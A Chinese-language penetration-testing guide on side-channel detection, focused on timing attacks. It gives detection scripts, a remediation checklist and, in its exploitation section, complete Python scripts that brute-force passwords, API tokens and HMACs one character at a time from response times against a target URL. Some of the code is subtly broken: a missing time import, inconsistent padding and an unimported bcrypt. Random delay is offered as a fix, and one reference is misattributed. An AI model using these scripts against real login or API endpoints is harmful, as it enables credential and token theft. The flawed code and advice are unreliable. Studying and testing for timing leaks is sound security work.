# 侧信道检测

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供侧信道攻击检测的方法论。通过本指南，测试人员可以识别和评估基于时间、功耗、电磁辐射等侧信道的安全漏洞。

### 1.2 适用范围
本文档适用于以下场景：
- 加密算法实现审计
- 身份验证系统测试
- API 响应时间分析
- 硬件安全模块评估
- 智能卡/令牌测试

### 1.3 读者对象
- 渗透测试工程师
- 硬件安全测试人员
- 密码学安全研究员
- 代码审计人员

---

## 第二部分：核心渗透技术专题

### 专题一：侧信道检测

#### 2.1 技术介绍

**侧信道攻击**是通过分析密码系统的物理实现特征（如执行时间、功耗、电磁辐射等）来获取敏感信息的攻击技术，而非直接攻击算法本身。

**侧信道攻击类型：**

| 类型 | 检测内容 | 风险等级 |
|------|---------|---------|
| 时序攻击 | 执行时间差异 | 中 - 高危 |
| 功耗分析 | 电力消耗模式 | 高危（硬件） |
| 电磁分析 | 电磁辐射模式 | 高危（硬件） |
| 缓存攻击 | CPU 缓存访问模式 | 高危（云环境） |
| 声学攻击 | 设备运行声音 | 低危 |
| 错误分析 | 错误注入和响应 | 高危 |

**常见时序攻击场景：**
```
1. 密码比较：逐字符比较导致时间差异
2. 查表操作：缓存命中/未命中导致时间差异
3. 条件分支：不同执行路径时间不同
4. 内存访问：不同地址访问时间不同
```

#### 2.2 检测常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户登录 | 密码验证 | 逐字符比较泄露信息 |
| API 认证 | Token 验证 | 时间差异泄露有效 Token |
| 签名验证 | HMAC/签名检查 | 时序攻击伪造签名 |
| 智能卡 | PIN 验证 | 功耗分析提取 PIN |
| HSM | 密钥操作 | 侧信道提取主密钥 |
| 云环境 | 共享 CPU | 缓存攻击窃取密钥 |

#### 2.3 漏洞检测方法

##### 2.3.1 时序攻击检测

```python
#!/usr/bin/env python3
"""
时序攻击检测脚本
检测密码/Token 比较是否存在时间差异
"""
import requests
import statistics
import time

class TimingAttackDetector:
    def __init__(self, target_url, param_name, auth_type='password'):
        self.url = target_url
        self.param_name = param_name
        self.auth_type = auth_type
        self.samples = 10  # 每个测试的样本数
    
    def measure_time(self, value):
        """测量请求时间"""
        times = []
        
        for _ in range(self.samples):
            if self.auth_type == 'password':
                data = {self.param_name: value}
                start = time.perf_counter()
                requests.post(self.url, data=data)
                end = time.perf_counter()
            elif self.auth_type == 'header':
                headers = {self.param_name: value}
                start = time.perf_counter()
                requests.get(self.url, headers=headers)
                end = time.perf_counter()
            else:
                raise ValueError("Unknown auth type")
            
            times.append(end - start)
        
        # 返回中位数（减少网络抖动影响）
        return statistics.median(times)
    
    def detect_timing_leak(self):
        """检测时序泄露"""
        print("[*] 开始时序攻击检测...")
        
        # 测试不同长度的输入
        results = {}
        for length in range(1, 10):
            test_value = 'A' * length
            avg_time = self.measure_time(test_value)
            results[length] = avg_time
            print(f"    长度 {length}: {avg_time*1000:.4f} ms")
        
        # 分析时间差异
        times = list(results.values())
        max_diff = max(times) - min(times)
        avg_diff = statistics.mean([abs(times[i+1]-times[i]) for i in range(len(times)-1)])
        
        print(f"\n[*] 最大时间差：{max_diff*1000:.4f} ms")
        print(f"[*] 平均时间差：{avg_diff*1000:.4f} ms")
        
        # 判断是否存在时序泄露
        if max_diff > 0.001:  # 大于 1ms 差异
            print("[!] 警告：检测到显著时间差异，可能存在时序漏洞")
            
            # 尝试逐字符破解
            self.character_by_character_attack()
        else:
            print("[+] 未发现明显时序泄露")
    
    def character_by_character_attack(self):
        """逐字符破解攻击"""
        print("\n[*] 尝试逐字符破解...")
        
        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
        known = ''
        target_length = 8  # 假设目标长度
        
        # 首先确定正确长度
        print("[*] 确定密码长度...")
        length_times = {}
        for l in range(1, 15):
            t = self.measure_time('A' * l)
            length_times[l] = t
            print(f"    长度 {l}: {t*1000:.4f} ms")
        
        # 找到时间最长的长度（可能表示长度正确）
        # 实际攻击需要更复杂的分析
        
        print("[!] 完整攻击需要更多样本和统计分析")

# 使用示例
# detector = TimingAttackDetector(
#     "https://target.com/login",
#     "password"
# )
# detector.detect_timing_leak()
```

##### 2.3.2 字符串比较时序漏洞

```python
#!/usr/bin/env python3
"""
检测字符串比较的时序漏洞
"""
import time
import hmac
import hashlib

def insecure_compare(a, b):
    """不安全的逐字节比较（存在时序漏洞）"""
    if len(a) != len(b):
        return False
    
    for i in range(len(a)):
        if a[i] != b[i]:
            return False
    
    return True

def secure_compare(a, b):
    """安全比较（恒定时间）"""
    return hmac.compare_digest(a, b)

def timing_test_compare(compare_func, target, guesses):
    """测试比较函数的时序特征"""
    results = []
    
    for guess in guesses:
        times = []
        for _ in range(100):
            start = time.perf_counter()
            compare_func(target.encode(), guess.encode())
            end = time.perf_counter()
            times.append(end - start)
        
        avg_time = sum(times) / len(times)
        results.append((guess, avg_time))
        print(f"    {guess}: {avg_time*1000:.6f} ms")
    
    return results

# 测试
target = "secret123"
guesses = ["axxxxxxxxx", "sxxxxxxxxx", "sexxxxxxxx", "secretxx", "secret123"]

print("不安全的比较:")
timing_test_compare(insecure_compare, target, guesses)

print("\n安全的比较:")
timing_test_compare(secure_compare, target, guesses)
```

##### 2.3.3 缓存时序攻击检测

```python
#!/usr/bin/env python3
"""
缓存时序攻击检测（针对云环境）
"""
import subprocess
import time

def detect_cache_timing_vulnerability():
    """
    检测共享环境中的缓存时序攻击可能性
    
    注意：此检测需要在目标环境中运行
    """
    print("[*] 缓存时序攻击检测")
    
    # Prime+Probe 攻击检测
    # 需要访问性能计数器
    
    try:
        # 使用 perf 工具（Linux）
        result = subprocess.run(
            ['perf', 'stat', '-e', 'cache-references,cache-misses', 
             'sleep', '1'],
            capture_output=True, text=True
        )
        
        print(f"    缓存引用：{result.stderr}")
        
    except FileNotFoundError:
        print("    [-] perf 工具不可用")
    
    # FLUSH+RELOAD 攻击检测
    # 需要共享内存页
    
    print("[!] 完整检测需要专门工具如 CacheBleed")

# 使用工具检测
# - CacheBleed: https://github.com/IAIK/cachebleed
# - Flush+Reload: https://github.com/IAIK/flushreload
```

##### 2.3.4 错误响应分析

```python
#!/usr/bin/env python3
"""
通过错误响应分析检测信息泄露
"""
import requests

def error_based_analysis(target_url):
    """分析不同输入导致的错误响应差异"""
    
    test_cases = [
        {"username": "admin", "password": "wrong"},
        {"username": "nonexistent", "password": "wrong"},
        {"username": "admin", "password": ""},
        {"username": "", "password": "wrong"},
    ]
    
    results = []
    
    for data in test_cases:
        resp = requests.post(target_url, data=data)
        
        results.append({
            'input': data,
            'status': resp.status_code,
            'time': resp.elapsed.total_seconds(),
            'length': len(resp.content),
            'message': resp.text[:100] if resp.text else ''
        })
        
        print(f"输入：{data}")
        print(f"    状态码：{resp.status_code}")
        print(f"    时间：{resp.elapsed.total_seconds()*1000:.2f} ms")
        print(f"    长度：{len(resp.content)}")
        print(f"    消息：{resp.text[:100]}")
        print()
    
    # 分析差异
    print("[*] 分析结果差异...")
    
    # 如果不同错误有不同的响应时间/长度/消息
    # 可能存在信息泄露
    
    times = [r['time'] for r in results]
    lengths = [r['length'] for r in results]
    
    if len(set(times)) > 1 or len(set(lengths)) > 1:
        print("[!] 检测到响应差异，可能存在信息泄露")
    else:
        print("[+] 响应一致，未发现明显信息泄露")

# 使用示例
# error_based_analysis("https://target.com/login")
```

#### 2.4 漏洞利用方法

##### 2.4.1 密码时序攻击

```python
#!/usr/bin/env python3
"""
密码时序攻击完整实现
"""
import requests
import statistics

class PasswordTimingAttack:
    def __init__(self, login_url, username):
        self.url = login_url
        self.username = username
        self.samples = 20
    
    def get_time(self, password):
        """测量登录请求时间"""
        times = []
        for _ in range(self.samples):
            start = time.perf_counter()
            resp = requests.post(self.url, data={
                'username': self.username,
                'password': password
            })
            end = time.perf_counter()
            times.append(end - start)
        return statistics.median(times)
    
    def find_correct_length(self, max_length=20):
        """找到正确的密码长度"""
        print("[*] 寻找密码长度...")
        
        length_times = {}
        for l in range(1, max_length + 1):
            password = 'A' * l
            t = self.get_time(password)
            length_times[l] = t
            print(f"    长度 {l}: {t*1000:.4f} ms")
        
        # 时间最长的可能是正确长度
        # （因为比较了所有字符）
        correct_length = max(length_times, key=length_times.get)
        print(f"[+] 可能的密码长度：{correct_length}")
        return correct_length
    
    def crack_character(self, position, known_prefix, charset):
        """破解单个字符"""
        best_time = 0
        best_char = None
        
        for char in charset:
            password = known_prefix + char + 'A' * (20 - position - 1)
            t = self.get_time(password)
            
            if t > best_time:
                best_time = t
                best_char = char
        
        return best_char, best_time
    
    def crack_password(self, charset='abcdefghijklmnopqrstuvwxyz0123456789'):
        """完整密码破解"""
        password_length = self.find_correct_length()
        password = ''
        
        print(f"\n[*] 开始破解，目标长度：{password_length}")
        
        for i in range(password_length):
            char, t = self.crack_character(i, password, charset)
            password += char
            print(f"    位置 {i}: '{char}' (时间：{t*1000:.4f} ms)")
            print(f"    当前密码：{password}")
        
        print(f"\n[+] 破解完成，密码可能是：{password}")
        return password

# 使用示例
# attack = PasswordTimingAttack("https://target.com/login", "admin")
# password = attack.crack_password()
```

##### 2.4.2 Token 验证时序攻击

```python
#!/usr/bin/env python3
"""
Token 验证时序攻击
"""
import requests
import string

def token_timing_attack(target_url, token_param='token', token_length=32):
    """
    通过时序攻击提取 Token
    """
    charset = string.hexdigits.lower()
    discovered = ''
    
    print(f"[*] 开始 Token 时序攻击，长度：{token_length}")
    
    for position in range(token_length):
        best_time = 0
        best_char = None
        
        for char in charset:
            test_token = discovered + char + '0' * (token_length - len(discovered) - 1)
            
            # 多次测量取平均
            times = []
            for _ in range(10):
                resp = requests.get(target_url, params={token_param: test_token})
                times.append(resp.elapsed.total_seconds())
            
            avg_time = sum(times) / len(times)
            
            if avg_time > best_time:
                best_time = avg_time
                best_char = char
        
        if best_char:
            discovered += best_char
            print(f"  位置 {position}: {best_char} (累计：{discovered})")
    
    print(f"\n[+] 提取的 Token: {discovered}")
    return discovered
```

##### 2.4.3 HMAC 时序攻击

```python
#!/usr/bin/env python3
"""
HMAC 时序攻击
针对逐字节比较的 HMAC 验证
"""

def hmac_timing_attack(target_url, message, correct_hmac_length=64):
    """
    通过时序攻击提取正确的 HMAC
    
    前提：服务器使用逐字节比较验证 HMAC
    """
    import string
    
    charset = string.hexdigits.lower()
    discovered = ''
    
    print(f"[*] HMAC 时序攻击")
    print(f"    消息：{message}")
    print(f"    目标 HMAC 长度：{correct_hmac_length}")
    
    for position in range(correct_hmac_length):
        best_time = 0
        best_char = None
        
        for char in charset:
            test_hmac = discovered + char + '0' * (correct_hmac_length - len(discovered) - 1)
            
            # 发送请求
            import requests
            times = []
            for _ in range(20):  # 多样本
                resp = requests.post(target_url, data={
                    'message': message,
                    'hmac': test_hmac
                })
                times.append(resp.elapsed.total_seconds())
            
            avg_time = sum(times) / len(times)
            
            if avg_time > best_time:
                best_time = avg_time
                best_char = char
        
        if best_char:
            discovered += best_char
            print(f"  位置 {position}: {best_char}")
    
    print(f"\n[+] 提取的 HMAC: {discovered}")
    return discovered
```

#### 2.5 安全修复建议

##### 2.5.1 恒定时间比较

```python
# ❌ 不安全 - 逐字节比较
def insecure_compare(a, b):
    if len(a) != len(b):
        return False
    for i in range(len(a)):
        if a[i] != b[i]:
            return False
    return True

# ✅ 安全 - 恒定时间比较
import hmac

def secure_compare(a, b):
    return hmac.compare_digest(a, b)

# 或使用 secrets 模块
import secrets

def secure_compare_v2(a, b):
    return secrets.compare_digest(a, b)
```

```java
// ✅ Java 恒定时间比较
import java.security.MessageDigest;

public boolean constantTimeCompare(byte[] a, byte[] b) {
    if (a.length != b.length) {
        return false;
    }
    
    int result = 0;
    for (int i = 0; i < a.length; i++) {
        result |= a[i] ^ b[i];
    }
    
    return result == 0;
}
```

##### 2.5.2 添加随机延迟

```python
import random
import time

def add_random_delay(min_ms=100, max_ms=500):
    """添加随机延迟混淆时序"""
    delay = random.uniform(min_ms, max_ms) / 1000
    time.sleep(delay)

# 在敏感操作后添加
def verify_password(input_password, stored_hash):
    result = bcrypt.checkpw(input_password, stored_hash)
    add_random_delay()  # 混淆时序
    return result
```

##### 2.5.3 侧信道防护检查清单

**软件层面:**
- [ ] 使用恒定时间比较函数
- [ ] 避免基于敏感数据的条件分支
- [ ] 添加随机延迟混淆
- [ ] 统一错误响应
- [ ] 限制请求速率（防止统计分析）

**硬件层面:**
- [ ] 功耗均衡设计
- [ ] 电磁屏蔽
- [ ] 噪声注入
- [ ] 缓存分区

**架构层面:**
- [ ] 敏感操作隔离
- [ ] 资源预留
- [ ] 云环境实例隔离

---

## 第三部分：附录

### 3.1 侧信道检测工具

| 工具 | 用途 | 平台 |
|-----|------|------|
| ChipWhisperer | 功耗/电磁分析 | 硬件 |
| CacheBleed | 缓存攻击检测 | Linux |
| dudect | 恒定时间检测 | 跨平台 |
| Python timeit | 时序分析 | 跨平台 |

### 3.2 时序攻击风险评级

| 时间差异 | 风险等级 | 建议 |
|---------|---------|------|
| > 10ms | 严重 | 立即修复 |
| 1-10ms | 高危 | 尽快修复 |
| 0.1-1ms | 中危 | 计划修复 |
| < 0.1ms | 低危 | 持续监控 |

### 3.3 常见时序漏洞场景

| 场景 | 漏洞 | 修复 |
|-----|------|------|
| 密码比较 | 逐字符比较 | 恒定时间比较 |
| HMAC 验证 | 逐字节验证 | 恒定时间比较 |
| Token 验证 | 长度检查 | 统一处理 |
| 查表操作 | 缓存差异 | 恒定时间查表 |

---

## 参考资源

- [Timing Attack - Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)
- [dudect - Detecting Timing Leaks](https://github.com/oreparaz/dudect)
- [ChipWhisperer](https://www.chipwhisperer.com/)
- [NIST SP 800-38D](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
